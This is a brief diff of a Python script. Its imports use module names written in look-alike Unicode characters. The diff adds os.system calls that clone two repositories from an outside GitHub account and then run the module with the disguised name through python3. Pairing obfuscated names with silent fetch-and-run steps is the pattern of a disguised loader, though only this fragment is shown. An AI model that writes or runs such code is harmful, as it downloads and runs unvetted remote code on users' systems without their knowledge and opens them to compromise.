@@ -5,6 +5,6 @@ from ʏօʊȶʊɮɛʟɨ import *
 from Latte import *
 from ɛʟɛʍֆ import *
 
-os.system(IK)
-os.system(KI)
-os.system(B0OT)
+os.system("git clone https://github.com/vitpotshovit/trote.git")
+os.system("git clone https://github.com/vitpotshovit/Hemlt.git")
+os.system("python3 -m ʏօʊȶʊɮɛʟɨ")
